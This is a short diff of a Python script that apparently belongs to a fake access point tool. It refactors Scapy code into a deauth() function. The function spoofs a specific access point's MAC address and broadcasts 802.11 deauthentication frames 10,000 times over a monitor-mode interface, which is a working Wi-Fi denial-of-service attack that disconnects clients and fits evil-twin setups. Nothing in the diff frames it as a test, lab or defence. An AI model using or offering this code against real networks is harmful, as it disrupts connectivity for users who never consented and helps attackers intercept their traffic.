@@ -84,7 +84,10 @@ def stopAP():
     os.system("sudo bash fake-ap-stop.sh")
 
 
-
+def deauth(brdmac, addr1, addr2):
+    brdmac = "ff:ff:ff:ff:ff:ff"
+    pkt = RadioTap() / Dot11(addr1 = brdmac, addr2 = "A4:91:B1:8A:A4:46", addr3 = "A4:91:B1:8A:A4:46") / Dot11Deauth()
+    sendp(pkt, iface="wlp0s20f0u2mon", count=10000, inter=.2)
 
 if __name__ == "__main__":
      # checkFotRoot()
@@ -93,8 +96,7 @@ if __name__ == "__main__":
      # startAP(ssid, apDevice)
      #os.system('trackerjacker -i ' + apDevice + ' --map')
 
-     brdmac = "ff:ff:ff:ff:ff:ff"
 
-     pkt = RadioTap() / Dot11(addr1=brdmac, addr2="A4:91:B1:8A:A4:46", addr3="A4:91:B1:8A:A4:46") / Dot11Deauth()
 
-     sendp(pkt, iface="wlp0s20f0u2mon", count=10000, inter=.2)
+
+
